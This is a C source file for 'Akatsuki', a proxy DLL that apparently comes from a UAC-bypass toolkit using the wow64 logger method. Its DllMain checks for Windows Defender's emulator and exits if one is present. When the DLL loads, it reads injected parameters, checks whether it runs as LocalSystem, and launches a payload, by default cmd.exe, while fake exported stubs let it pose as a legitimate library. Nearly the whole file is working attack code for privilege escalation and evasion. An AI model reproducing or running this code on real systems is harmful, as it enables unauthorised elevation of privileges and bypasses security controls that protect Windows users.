/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  Proxy dll entry point, Akatsuki.
*  Special dll for wow64 logger method.
*  Akatsuki must be special, isn't it?
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(push)
#pragma warning(disable: 4005 4201)

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"
#include "shared\util.h"
#include "shared\windefend.h"

#pragma warning(pop)

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define LoadedMsg      TEXT("Akatsuki lock and loaded")

HANDLE g_SyncMutant = NULL;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{

}

/*
* DbgDumpRuntimeInfo
*
* Purpose:
*
* TBD.
*
*/
VOID DbgDumpRuntimeInfo()
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    WCHAR szReportName[MAX_PATH * 2];
    WCHAR sysdir[MAX_PATH + 1];

    DWORD cch;
    LPWSTR lpText = NULL;

    DWORD bytesIO;
    WCHAR ch;

    cch = ucmExpandEnvironmentStrings(L"%temp%\\", sysdir, MAX_PATH);
    if ((cch != 0) && (cch < MAX_PATH)) {
        _strcpy(szReportName, sysdir);
        _strcat(szReportName, TEXT("report_"));
        ultostr(GetCurrentProcessId(), _strend(szReportName));
        _strcat(szReportName, TEXT(".txt"));

        hFile = CreateFile(szReportName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {

            ch = (WCHAR)0xFEFF;
            WriteFile(hFile, &ch, sizeof(WCHAR), &bytesIO, NULL);

            lpText = ucmQueryRuntimeInfo(TRUE);
            if (lpText) {
                WriteFile(hFile, lpText, (DWORD)(_strlen(lpText) * sizeof(WCHAR)), &bytesIO, NULL);
                ucmDestroyRuntimeInfo(lpText);
            }
            CloseHandle(hFile);
        }
    }
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bIsLocalSystem = FALSE, bReadSuccess;
    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;
    ULONG SessionId = 0;

    if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
        ExitProcess(0);

    ucmIsLocalSystem(&bIsLocalSystem);

    bReadSuccess = ucmReadParameters(
        &lpParameter,
        &cbParameter,
        NULL,
        &SessionId,
        bIsLocalSystem);

    ucmLaunchPayload2(
        bIsLocalSystem, 
        SessionId, 
        lpParameter, 
        cbParameter);

    if (bReadSuccess) {
        RtlFreeHeap(
            NtCurrentPeb()->ProcessHeap,
            0,
            lpParameter);
    }

    ExitProcess(0);
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
        ExitProcess('Foff');

    if (fdwReason == DLL_PROCESS_ATTACH) {
        OutputDebugString(LoadedMsg);
        //DbgDumpRuntimeInfo();
        DefaultPayload();
    }
    return TRUE;
}
